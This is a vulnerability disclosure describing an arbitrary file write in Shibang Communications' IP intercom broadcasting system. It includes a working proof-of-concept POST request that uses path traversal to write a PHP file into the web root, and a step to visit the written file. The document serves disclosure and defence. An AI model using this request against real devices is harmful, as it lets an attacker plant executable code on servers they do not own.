There is an arbitrary file writing vulnerability in the IP network intercom broadcasting system of Shibang Communications Co., Ltd.

1. Impact of vulnerabilities
   
IP network intercom broadcasting system

2. Vulnerability location
/php/busyscreenshotpush.php

Vulnerability recurrence

![image](https://github.com/garboa/cve_3/assets/22628693/a88017dc-fb5e-4ca8-9142-31b4bfd6b199)

1. Pass in the writing file path through the jsondata[callee] parameter, pass in the file name through jsondata[imagename], and finally pass in the base64 encoding of the writing content through jsondata[imagecontent]. The POC is as follows
```
POST /php/busyscreenshotpush.php HTTP/1.1
Host: ip:port
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
X-Forwarded-For: 192.168.1.23
Content-Type: application/x-www-form-urlencoded
Content-Length: 132

jsondata[caller]=1&jsondata[callee]=../../../../../ICPAS/Wnmp/WWW/php/&jsondata[imagename]=1_2_3.php&jsondata[imagecontent]=aGVsbG8=
```
![image](https://github.com/garboa/cve_3/assets/22628693/5603376f-87c7-4e9e-829d-2432ce194c0a)

2.  Visit /php/1_2_3.php
![image](https://github.com/garboa/cve_3/assets/22628693/bce36231-4ac2-4fed-9e05-b16de844e7f5)

